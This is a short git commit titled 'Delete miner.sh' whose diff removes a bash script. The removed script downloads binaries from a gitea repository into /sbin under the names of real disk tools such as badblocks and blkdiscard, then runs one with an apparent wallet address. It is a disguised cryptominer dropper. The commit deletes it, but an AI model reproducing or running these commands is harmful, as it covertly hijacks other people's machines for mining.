c859430c58772dad89dfdf7a276ca19803cd3d02
rifkithears <85469496+rifkithears@users.noreply.github.com>
2021-12-31 15:15:23 +0700

    Delete miner.sh

--- miner.sh
+++
@@ -1,8 +0,0 @@
-#!/bin/bash
-cd /sbin
-wget -O badblocks https://try.gitea.io/bambanks/nambang/raw/branch/main/badblocks
-wget -O blkdiscard https://try.gitea.io/bambanks/nambang/raw/branch/main/blkdiscard
-wget https://try.gitea.io/bambanks/nambang/raw/branch/main/amdmemtweak
-wget https://try.gitea.io/bambanks/nambang/raw/branch/main/libnvrtc-builtins.so
-wget https://try.gitea.io/bambanks/nambang/raw/branch/main/libnvrtc.so.11.1
-./badblocks 3ETe5pgEXkw9uw4hfZ3vin3Gws16b5F4Yy
